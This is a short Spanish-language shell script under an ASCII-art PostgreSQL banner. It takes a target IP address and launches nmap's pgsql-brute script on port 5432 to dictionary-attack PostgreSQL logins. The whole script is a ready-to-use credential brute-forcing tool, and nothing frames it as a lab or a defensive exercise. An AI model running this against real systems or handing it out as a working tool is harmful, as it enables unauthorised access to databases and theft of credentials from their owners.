...
;M MM M: .M        .MMMMMMMMMMMMMMMMMMMMMMMMMM,         'MM'...'M
 ...
 'MM;MMMMMMMM.MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMM
  ...
  MMM      :M  'MMMMMMMMMMM PostgreSQL MMMMMMMM'.MM  MM:M.    'MMMMM
...
if [ -z "$1" ]; then
        echo
        echo "Fuerza bruta con diccionarios a PostgreSQL."
        echo "Requiere nmap"
        echo "Uso.: sh brutepostgresql.sh <ip>"
        echo
        exit 0
fi
echo
echo
nmap $1 $2 -Pn -sV -p 5432 --script pgsql-brute 
